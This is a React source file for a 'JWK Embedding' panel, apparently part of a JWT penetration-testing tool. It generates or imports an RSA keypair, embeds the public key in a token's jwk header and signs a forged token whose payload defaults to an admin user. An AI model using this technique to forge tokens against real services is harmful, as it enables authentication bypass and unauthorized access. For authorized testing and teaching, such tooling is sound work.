import { useState, useCallback } from 'react'
import { motion } from 'framer-motion'
import { useJWTState } from '../../../context/JWTContext'
import { useForgedToken } from '../../../hooks/useForgedToken'
import { useKeyManager } from '../../../hooks/useKeyManager'
import { JsonEditor } from '../../shared/JsonEditor'
import { KeyUpload } from '../../shared/KeyUpload'
import { OutputToken } from '../../shared/OutputToken'
import { CopyButton } from '../../shared/CopyButton'

export function JwkEmbeddingPanel() {
  const { decoded } = useJWTState()
  const {
    modifiedHeader, modifiedPayload,
    forgedToken, forgeError, isForging,
    forgeToken, setModifiedHeader, setModifiedPayload,
  } = useForgedToken()
  const { activeKey, generateRSA, importPrivatePEM } = useKeyManager()

  const [isGenerating, setIsGenerating] = useState(false)
  const [keyError, setKeyError] = useState<string | null>(null)

  const handleGenerateKeypair = useCallback(async () => {
    setIsGenerating(true)
    setKeyError(null)
    try {
      await generateRSA({ modulusLength: 2048, hash: 'SHA-256' })
    } finally {
      setIsGenerating(false)
    }
  }, [generateRSA])

  const handleUploadPrivateKey = useCallback(async (pem: string) => {
    setKeyError(null)
    try {
      await importPrivatePEM(pem, 'Uploaded Private Key')
    } catch (e) {
      setKeyError((e as Error).message)
    }
  }, [importPrivatePEM])

  const handleForge = useCallback(async () => {
    if (!activeKey?.privateKey || !activeKey?.publicKeyJwk || !modifiedHeader) return

    // Build JWK for embedding (public key only, sig usage)
    const jwkForHeader = {
      kty: activeKey.publicKeyJwk.kty || 'RSA',
      n: (activeKey.publicKeyJwk as any).n || '',
      e: (activeKey.publicKeyJwk as any).e || '',
      use: 'sig',
    }

    const header = { ...modifiedHeader, alg: 'RS256', jwk: jwkForHeader }
    setModifiedHeader(header)

    await forgeToken(activeKey.privateKey, 'RS256')
  }, [activeKey, modifiedHeader, forgeToken, setModifiedHeader])

  if (!decoded) {
    return (
      <motion.div
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        style={{
          border: '1px solid var(--border)',
          borderRadius: 'var(--radius-lg)',
          background: 'var(--bg-secondary)',
          overflow: 'hidden',
        }}
      >
        <PanelHeader title="JWK Embedding" desc="Embed attacker's public key directly in jwk header" icon="🔐" />
        <div style={{ padding: '40px 18px', textAlign: 'center', color: 'var(--text-muted)', fontSize: 14 }}>
          Paste a JWT token in the Decoder above first.
        </div>
      </motion.div>
    )
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      style={{
        border: '1px solid var(--border)',
        borderRadius: 'var(--radius-lg)',
        background: 'var(--bg-secondary)',
        overflow: 'hidden',
      }}
    >
      <PanelHeader
        title="JWK Embedding"
        desc="Embed attacker public key directly in the jwk header field. Target server trusts the embedded key."
        icon="🔐"
      />

      <div style={{ padding: '16px 18px', display: 'flex', flexDirection: 'column', gap: 16 }}>
        {/* Key source */}
        <div style={{ display: 'flex', gap: 12, flexWrap: 'wrap' }}>
          <button
            onClick={handleGenerateKeypair}
            disabled={isGenerating}
            style={{
              padding: '10px 24px',
              border: '1px solid var(--accent)',
              borderRadius: 'var(--radius-md)',
              background: isGenerating ? 'var(--bg-tertiary)' : 'var(--accent-bg)',
              color: isGenerating ? 'var(--text-muted)' : 'var(--accent)',
              fontWeight: 600,
              fontSize: 14,
              fontFamily: 'var(--sans)',
              cursor: isGenerating ? 'wait' : 'pointer',
              transition: 'all var(--transition-fast)',
            }}
          >
            {isGenerating ? '⏳ Generating...' : '🔑 Generate RSA Keypair'}
          </button>
          <span style={{ color: 'var(--text-muted)', alignSelf: 'center', fontSize: 13 }}>or</span>
        </div>

        <KeyUpload
          label="Upload Existing Private Key"
          onKeyLoaded={handleUploadPrivateKey}
        />

        {keyError && (
          <div style={{
            padding: '10px 14px',
            background: 'var(--danger-bg)',
            border: '1px solid var(--danger)',
            borderRadius: 'var(--radius-sm)',
            fontSize: 13,
            color: 'var(--danger)',
            fontFamily: 'var(--mono)',
          }}>
            {keyError}
          </div>
        )}

        {/* Header preview with embedded JWK */}
        {activeKey?.publicKeyJwk && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            transition={{ duration: 0.2 }}
          >
            <div style={{
              border: '1px solid var(--border)',
              borderRadius: 'var(--radius-md)',
              overflow: 'hidden',
              background: 'var(--bg-secondary)',
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                padding: '8px 14px',
                borderBottom: '1px solid var(--border)',
                background: 'var(--bg-tertiary)',
              }}>
                <span style={{ fontSize: 12, fontWeight: 600, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                  Header with Embedded JWK
                </span>
                <CopyButton
                  text={JSON.stringify({
                    alg: 'RS256',
                    jwk: {
                      kty: activeKey.publicKeyJwk.kty || 'RSA',
                      n: (activeKey.publicKeyJwk as any).n || '',
                      e: (activeKey.publicKeyJwk as any).e || '',
                      use: 'sig',
                    },
                  }, null, 2)}
                  label="Copy Header"
                />
              </div>
              <pre style={{
                fontFamily: 'var(--mono)',
                fontSize: 13,
                color: 'var(--text-primary)',
                padding: '12px 14px',
                margin: 0,
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-all',
                maxHeight: 300,
                overflowY: 'auto',
                background: 'var(--bg-code)',
              }}>
                {JSON.stringify({
                  alg: 'RS256',
                  jwk: {
                    kty: activeKey.publicKeyJwk.kty || 'RSA',
                    n: (activeKey.publicKeyJwk as any).n || '',
                    e: (activeKey.publicKeyJwk as any).e || '',
                    use: 'sig',
                  },
                }, null, 2)}
              </pre>
            </div>
          </motion.div>
        )}

        {/* Payload editor */}
        <JsonEditor
          label="Payload"
          value={modifiedPayload || { user: 'admin' }}
          onChange={setModifiedPayload}
        />

        {/* Forge */}
        <button
          onClick={handleForge}
          disabled={isForging || !activeKey}
          style={{
            padding: '10px 24px',
            border: 'none',
            borderRadius: 'var(--radius-md)',
            background: activeKey ? 'var(--accent)' : 'var(--bg-tertiary)',
            color: activeKey ? '#fff' : 'var(--text-muted)',
            fontWeight: 600,
            fontSize: 14,
            fontFamily: 'var(--sans)',
            cursor: activeKey ? 'pointer' : 'not-allowed',
            transition: 'all var(--transition-fast)',
            width: 'fit-content',
          }}
          onMouseEnter={e => {
            if (activeKey) e.currentTarget.style.background = 'var(--accent-hover)'
          }}
          onMouseLeave={e => {
            if (activeKey) e.currentTarget.style.background = 'var(--accent)'
          }}
        >
          {isForging ? 'Forging...' : '🔨 Forge Token'}
        </button>

        <OutputToken token={forgedToken} error={forgeError} isForging={isForging} />
      </div>
    </motion.div>
  )
}

function PanelHeader({ title, desc, icon }: { title: string; desc: string; icon: string }) {
  return (
    <div style={{
      padding: '12px 18px',
      borderBottom: '1px solid var(--border)',
      background: 'var(--bg-tertiary)',
      display: 'flex',
      alignItems: 'center',
      gap: 10,
    }}>
      <span style={{ fontSize: 18 }}>{icon}</span>
      <div>
        <div style={{ fontSize: 15, fontWeight: 600 }}>{title}</div>
        <div style={{ fontSize: 12, color: 'var(--text-muted)', marginTop: 1 }}>{desc}</div>
      </div>
    </div>
  )
}
